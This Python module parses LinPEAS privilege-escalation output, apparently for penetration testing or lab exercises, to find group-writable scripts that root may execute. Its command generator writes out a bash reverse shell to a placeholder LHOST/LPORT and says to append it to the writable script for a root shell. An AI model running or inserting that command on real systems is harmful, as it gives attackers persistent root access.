"""Detect group-writable executable scripts in system directories from LinPEAS output.

These scripts may be called by root via MOTD, cron, or service.
Cross-references the "Interesting GROUP writable files" section with the
"Executable files potentially added by user" section to confirm execution.
"""

import re
from typing import Dict, List, Set, Tuple

# Matches timestamp lines from "Executable files potentially added by user":
#   2018-03-11+23:25:44 /opt/cube/cube.sh              (synthetic)
#   2018-03-11+23:25:44.6493940440 /opt/cube/cube.sh   (real LinPEAS)
_TIMESTAMP_PATH_RE = re.compile(r"^\d{4}-\d{2}-\d{2}[+T]\d{2}:\d{2}:\d{2}(?:\.\d+)?\s+(/\S+)")

# Matches ls -l lines: -rwxrwxr-x 1 root sysadmin ... /path/script.sh
_LS_L_RE = re.compile(r"^([-dl][rwxsStT-]{9})\s+\d+\s+\S+\s+\S+\s+\d+\s+\S.+\s+(/\S+)$")

# Matches bare path lines ending in .sh or .py
_BARE_SCRIPT_RE = re.compile(r"^(/[^\s,;'\"]+(?:\.sh|\.py))$")

# Directories handled by dedicated modules or not interesting at the system level
_EXCLUDED_PREFIXES: Tuple[str, ...] = (
    "/home/", "/root/", "/tmp/", "/var/tmp/",
    "/etc/update-motd.d/",     # handled by motd_writable.py
    "/usr/bin/", "/usr/sbin/", "/bin/", "/sbin/",
)

# Non-system directories where a group-writable script is a strong privesc signal alone
_STRONG_SIGNAL_PREFIXES: Tuple[str, ...] = (
    "/opt/", "/srv/", "/usr/local/",
)


def _is_excluded(path: str) -> bool:
    """Return True if the path should be ignored."""
    return any(path.startswith(p) for p in _EXCLUDED_PREFIXES)


def _is_writable_perm(perm: str) -> bool:
    """Return True if the 10-char ls permission string has group or other write."""
    # perm[5] = group-write, perm[8] = other-write
    return len(perm) >= 10 and (perm[5] == "w" or perm[8] == "w")


def _is_strong_signal_dir(path: str) -> bool:
    """Return True if the path is in a non-system directory where writable scripts are suspicious."""
    return any(path.startswith(p) for p in _STRONG_SIGNAL_PREFIXES)


def parse_writable_exec_section(section_text: str) -> List[Tuple[str, str]]:
    """Return (path, confidence) tuples for group-writable scripts in system directories.

    confidence is "HIGH" if:
      - path is in both group-writable AND executable-user-files (cross-referenced), OR
      - path is group-writable AND under /opt/, /srv/, /usr/local/ (strong signal alone)
    confidence is "MEDIUM" if only in group-writable in other directories.
    """
    writable_scripts: Set[str] = set()   # From group writable section
    exec_user_paths: Set[str] = set()    # From executable files section

    for line in section_text.splitlines():
        stripped = line.strip()
        if not stripped:
            continue

        # Timestamp lines come from "Executable files potentially added by user"
        m_ts = _TIMESTAMP_PATH_RE.match(stripped)
        if m_ts:
            path = m_ts.group(1)
            if not _is_excluded(path):
                exec_user_paths.add(path)
            continue

        # ls -l permission lines
        m_ls = _LS_L_RE.match(stripped)
        if m_ls:
            perm = m_ls.group(1)
            path = m_ls.group(2)
            name = path.rsplit("/", 1)[-1]
            if (
                _is_writable_perm(perm)
                and not _is_excluded(path)
                and (name.endswith(".sh") or name.endswith(".py"))
            ):
                writable_scripts.add(path)
            continue

        # Bare path lines (e.g. from "Group users:" listing)
        m_bare = _BARE_SCRIPT_RE.match(stripped)
        if m_bare:
            path = m_bare.group(1)
            if not _is_excluded(path):
                writable_scripts.add(path)

    results: List[Tuple[str, str]] = []
    for path in sorted(writable_scripts):
        if path in exec_user_paths or _is_strong_signal_dir(path):
            results.append((path, "HIGH"))
        else:
            results.append((path, "MEDIUM"))
    return results


def generate_commands(script_path: str) -> List[str]:
    """Generate investigation and exploit commands for a group-writable executable script."""
    return [
        f"cat /etc/update-motd.d/* 2>/dev/null | grep -F '{script_path}'",
        f"grep -r '{script_path}' /etc/cron* /etc/rc* /etc/init.d/ 2>/dev/null",
        f"# If called by root — append a reverse shell:",
        f"echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >> {script_path}",
        f"# Then trigger by SSHing in or waiting for cron/service restart",
    ]


def analyze(section_text: str) -> List[Dict]:
    """Analyze LinPEAS output for group-writable executable scripts in system directories."""
    findings: List[Dict] = []
    for path, confidence in parse_writable_exec_section(section_text):
        findings.append({
            "script_path": path,
            "severity": confidence,
            "type": "writable_exec_script",
            "description": "Group-writable executable script in system directory — may be called by root",
            "commands": generate_commands(path),
        })
    return findings


# ── CLI self-test ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    SAMPLE = """
╔══════════╣ Interesting GROUP writable files (not in Home)
Group users:
/opt/cube/cube.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2018-03-11+23:25:44.6493940440 /opt/cube/cube.sh
2018-03-11+20:27:48.0303333080 /etc/update-motd.d/00-header
"""
    print("=== parse_writable_exec_section ===")
    for path, confidence in parse_writable_exec_section(SAMPLE):
        print(f"  [{confidence}] {path}")

    print("\n=== analyze ===")
    for f in analyze(SAMPLE):
        print(f"[{f['severity']}] {f['type']} -> {f['script_path']}")
        for cmd in f["commands"][:3]:
            print(f"  $ {cmd}")
